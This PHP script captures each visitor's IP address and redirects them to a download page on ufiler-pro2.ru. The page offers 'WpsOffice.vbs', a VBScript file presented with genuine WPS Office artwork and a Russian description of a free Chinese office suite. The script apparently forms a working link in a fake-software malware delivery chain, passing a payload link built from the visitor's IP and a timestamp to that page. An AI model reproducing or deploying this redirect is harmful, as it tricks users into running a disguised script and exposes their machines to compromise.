<?php
// Include the function definition
function timeRandom() {
    return date('Y-m-d-H-i');
}

function getClientIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getClientIp();
// Generate the current timestamp without seconds
$timestamp = timeRandom();

// Define the relative URL without the tilde and URL-encode query parameters
$dn_url = "dn_light.php?ip=" . urlencode($ip) . "&random=" . urlencode($timestamp);

// Resolve the relative URL to an absolute URL
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https" : "http";
$domain = $_SERVER['HTTP_HOST']; // Get the current domain
$path = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\'); // Get the current path

// Combine protocol, domain, path, and relative URL to form the absolute URL
$absolute_dn_url = "$protocol://$domain$path/" . ltrim($dn_url, '/');

// Assuming https://ufiler-pro2.ru/download/3974/?file={dn_url}&poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png&size=10 мб.&description=Полнофункциональный оффисный пакет из Китая бесплатно&theme=software&title=WpsOffice.vbs is a template string with a placeholder for dn_url
$sponsor_url_template = "https://ufiler-pro2.ru/download/3974/?file={dn_url}&poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png&size=10 мб.&description=Полнофункциональный оффисный пакет из Китая бесплатно&theme=software&title=WpsOffice.vbs"; // Placeholder, replace with actual sponsor URL
$sponsor_url = str_replace("{dn_url}", urlencode($absolute_dn_url), $sponsor_url_template);

$url = $sponsor_url;

header("Location: $url");
exit;
?>